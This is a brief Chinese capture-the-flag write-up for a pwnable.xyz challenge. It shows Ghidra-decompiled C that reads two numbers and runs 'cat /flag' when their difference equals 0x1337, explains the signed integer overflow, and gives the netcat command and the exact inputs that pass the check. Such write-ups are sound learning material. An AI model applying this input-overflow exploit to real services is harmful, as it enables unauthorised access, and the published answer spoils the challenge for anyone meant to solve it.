ghidra查看代码
```c
undefined8 FUN_00100850(void)

{
  long in_FS_OFFSET;
  int local_18;
  int local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  FUN_00100a3e();
  local_18 = 0;
  local_14 = 0;
  __printf_chk(1,"1337 input: ");
  __isoc99_scanf("%u %u",&local_18,&local_14);
  if ((local_18 < 0x1337) && (local_14 < 0x1337)) {
    if (local_18 - local_14 == 0x1337) {
      system("cat /flag");
    }
  }
  else {
    puts("Sowwy");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}

```

很明显的int型值溢出
```shell
$ nc svc.pwnable.xyz 30001
1337 input: 2147488567 2147483648
```

